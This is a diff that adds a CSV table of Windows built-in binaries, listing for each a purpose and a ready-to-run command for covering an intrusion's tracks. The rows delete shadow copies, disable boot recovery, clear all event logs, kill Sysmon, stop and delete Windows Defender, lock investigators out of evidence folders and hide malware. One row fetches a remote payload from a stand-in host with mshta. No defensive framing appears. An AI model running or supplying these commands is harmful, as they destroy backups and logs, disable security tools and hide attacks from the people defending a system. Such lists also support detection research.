@@ -1,0 +1,21 @@
+LOLBin,Purpose,Example Usage
+vssadmin.exe,Delete shadow copies (Volume Shadow Snapshots),vssadmin delete shadows /all /quiet
+bcdedit.exe,"Tamper with bootloader, disable recovery",bcdedit /set {default} recoveryenabled no
+cipher.exe,Secure free space wiping,cipher /w:C:\
+wevtutil.exe,Clear event logs,wevtutil cl System
+fsutil.exe,Disable last access timestamp,fsutil behavior set disablelastaccess 1
+schtasks.exe,Schedule time-delayed cleanups,"schtasks /create /tn CleanLogs /tr ""wevtutil cl *"" /sc once /st 00:01"
+reg.exe,Modify/delete registry entries,reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MaliciousEntry /f
+attrib.exe,Hide files/directories,attrib +h +s malware.exe
+powershell.exe,In-memory or fileless script execution,"powershell -nop -w hidden -c ""Clear-EventLog -LogName *"""
+rundll32.exe,In-memory DLL execution,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";"
+cmd.exe,Chain and script actions,cmd /c del /f /q C:\*.log
+forfiles.exe,Wipe old logs or scheduled cleanups,"forfiles /p ""C:\logs"" /s /m *.* /d -7 /c ""cmd /c del @path"""
+taskkill.exe,Kill monitoring or logging services,taskkill /f /im sysmon.exe
+netsh.exe,Disable or reconfigure firewalls/logging,netsh advfirewall set allprofiles logging droppedconnections disable
+net.exe,Create/remove users,net user attacker /delete
+sc.exe,Stop/delete security or forensic services,sc stop WinDefend && sc delete WinDefend
+icacls.exe,Modify file/folder permissions,icacls C:\Evidence /deny forensicuser:(OI)(CI)F
+wscript.exe,Fileless JS/VBS execution,wscript.exe cleanup.vbs
+mshta.exe,In-memory HTML/JS payload execution,mshta http://evil/payload.hta
+diskshadow.exe,Scripted VSS deletion or tampering,diskshadow /s cleanup.dsh
